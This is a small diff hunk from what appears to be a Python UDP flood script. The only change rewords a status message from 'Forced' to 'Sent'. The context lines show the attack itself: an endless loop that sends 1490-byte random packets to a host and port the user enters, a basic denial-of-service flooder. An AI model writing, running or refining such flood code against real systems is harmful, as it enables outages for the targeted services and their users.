@@ -9,5 +9,5 @@ port = int(input('port: '))
 i = 0
 while True:
     s.sendto(random._urandom(1490), (host, port))
-    print(f'[*]Forced {i} packets on {host}')
+    print(f'[*] Sent {i} packets to {host}')
     i += 1
